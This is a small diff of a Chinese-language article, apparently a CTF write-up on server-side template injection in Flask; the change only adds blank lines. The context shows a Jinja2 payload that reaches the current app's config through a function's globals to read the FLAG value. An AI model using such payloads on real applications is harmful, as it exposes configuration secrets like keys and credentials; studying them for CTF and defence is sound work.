@@ -143,8 +143,11 @@ get_flashed_messages():这个函数会返回之前在flask中通过flask（）�
 最后构造出如下payload
 
 ```
+
 {{get_flashed_messages.__globals__['current_app'].config['FLAG']}}
+
 ```
+
 
 #### 各类ssti的一些模板渲染引擎及利用
 ![7.png](https://xzfile.aliyuncs.com/media/upload/picture/20181221165627-4d167624-04fe-1.png)
